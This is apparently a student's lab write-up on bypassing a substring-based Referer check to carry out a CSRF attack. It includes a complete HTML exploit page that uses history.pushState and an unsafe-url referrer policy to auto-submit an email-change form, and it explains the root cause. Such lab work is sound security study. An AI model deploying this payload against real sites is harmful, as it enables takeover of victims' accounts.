# Lab 11: CSRF with Broken Referer Validation

## Objective

The goal of this lab was to exploit a CSRF vulnerability caused by incorrect Referer header validation.

The application attempts to block cross-domain requests by checking the Referer header, but the validation relies on a simple string match rather than properly verifying the request's origin.

## Analysis

1. **Inspecting the Referer validation**

   The email change functionality checks the Referer header to determine whether the request comes from the trusted lab domain.

   During testing, I found that the validation only looks for the lab domain as a substring. It does not properly verify that the domain is actually the origin of the request.

2. **Identifying the bypass**

   Because the application only searches for the domain string, it accepts a Referer containing the lab domain somewhere in its path.

   For example, a URL like this could pass the check:

   ```text
   https://exploit-server.example/?LAB-DOMAIN
   ```

   Although the actual origin belongs to the exploit server, the Referer contains the expected lab domain.

3. **Manipulating the browser URL**

   Used JavaScript's `history.pushState()` to modify the exploit page's URL without navigating away from it:

   ```javascript
   history.pushState('', '', '/?LAB-DOMAIN');
   ```

   This changes the URL path and query string while keeping the page loaded on the exploit server.

   The `unsafe-url` referrer policy allows the browser to include the full URL in the Referer header, including the added lab domain string.

## Exploitation

I hosted the following HTML on the exploit server:

```html id="m8z3kp"
<meta name="referrer" content="unsafe-url">

<script>
    history.pushState('', '', '/?LAB-DOMAIN');
</script>

<form method="POST" action="https://LAB-DOMAIN/my-account/change-email">
    <input type="hidden" name="email" value="sss@sss.ss">
</form>

<script>
    document.forms[0].submit();
</script>
```

When the victim visits the exploit page:

1. `history.pushState()` adds the lab domain to the exploit page's URL.
2. The browser submits the form to the target application.
3. The `unsafe-url` policy allows the full exploit-page URL to be sent in the Referer header.
4. The application's substring check finds the lab domain in the Referer and accepts the request.

## Result

Successfully solved the lab by bypassing the Referer validation with a manipulated URL.

The root cause was improper domain validation. The application checked whether the Referer contained the trusted domain instead of validating the actual origin or hostname.